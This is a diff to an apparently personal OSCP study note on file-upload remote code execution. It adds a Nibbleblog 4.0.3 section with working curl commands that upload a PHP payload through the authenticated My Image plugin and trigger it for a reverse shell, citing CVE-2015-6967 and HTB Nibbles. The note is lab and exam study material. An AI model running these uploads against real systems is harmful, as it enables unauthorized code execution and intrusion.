@@ -61,6 +61,42 @@ curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engin
 The literal `|` separates the action from the new filename. Verify the `.png` returns HTTP 200 before renaming, then request the resulting `.php` file to confirm execution.
 
 #### Tags: #WordPress #SimpleFileList #FileUpload #RCE #CVE202036847 #CommandBreakdowns
+
+---
+
+### Nibbleblog 4.0.3 authenticated plugin upload
+
+```bash
+curl -s -b "$CookieFile" \
+  -F 'plugin=my_image' \
+  -F 'title=My image' \
+  -F 'position=4' \
+  -F 'caption=' \
+  -F "image=@$PayloadFile;type=application/x-php" \
+  -F 'image_resize=1' \
+  -F 'image_width=230' \
+  -F 'image_height=200' \
+  -F 'image_option=auto' \
+  "http://$BoxIP/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image" \
+  -o /dev/null -w '%{http_code}\n'
+curl -s "http://$BoxIP/nibbleblog/content/private/plugins/my_image/image.php"
+```
+
+| Part | Meaning |
+|---|---|
+| `-b "$CookieFile"` | Sends the authenticated Nibbleblog session cookie. |
+| `plugin`, `title`, `position`, `caption` | Plugin configuration fields expected by the My Image handler. |
+| `image=@$PayloadFile;type=application/x-php` | Reads the local PHP payload and labels the multipart part as PHP. |
+| `image_resize`, `image_width`, `image_height`, `image_option` | Image-processing fields required by the plugin request. |
+| `controller=plugins&action=config&plugin=my_image` | Routes the request to the authenticated plugin configuration endpoint. |
+| `/content/private/plugins/my_image/image.php` | Predictable server-side filename used after upload; requesting it executes the PHP payload. |
+
+The upload requires valid admin authentication and the My Image plugin. The response can be HTTP 200 even when the useful result is the reverse-shell callback, so verify the listener and then treat a hanging trigger request as expected behavior while the shell keeps the connection open.
+
+**Where it comes from:** CVE-2015-6967 and Exploit-DB 38489. The underlying request was reproduced manually from the reviewed module source in [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|HTB Nibbles]].
+
+#### Tags: #Nibbleblog #FileUpload #RCE #CVE20156967 #CommandBreakdowns
+
 This area grows alongside the modules, currently the only entry, revisit once more file-upload-specific techniques (extension/MIME filter bypasses, polyglot files) show up in a module rather than a box writeup.
 ## External Resources
 
@@ -69,3 +105,14 @@ This area grows alongside the modules, currently the only entry, revisit once mo
 - [RevShells](https://www.revshells.com/) for payload troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/09. Common Web Application Attacks]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
